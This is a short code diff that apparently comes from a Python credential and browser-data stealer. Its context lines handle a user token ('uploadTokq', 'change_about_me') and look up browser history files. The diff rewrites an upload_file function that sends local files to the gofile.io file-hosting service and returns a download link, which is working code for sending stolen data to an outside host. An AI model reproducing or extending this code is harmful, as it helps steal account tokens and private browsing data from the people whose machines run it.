@@ -981,25 +981,9 @@ def uploadTokq(Tokq, path):
     if changebio == True:
         change_about_me(Tokq)
 
-
-from requests.exceptions import Timeout
-
-def upload_file(file_path):
-    try:
-        response = requests.post(
-            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
-            files={'file': open(file_path, 'rb')},
-            timeout=1 
-        )
-        return response.json()["data"]["downloadPage"]
-    except Timeout:
-        response_backup = requests.post(
-            'https://server4.gofile.io/uploadFile',
-            files={'file': open(file_path, 'rb')}
-        )
-        return response_backup.json()["data"]["downloadPage"]
-    except Exception as e:
-        return False
+def upload_file(path):
+    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
+    except:return False
     
 
 def find_history_file(browser_name, path_template):
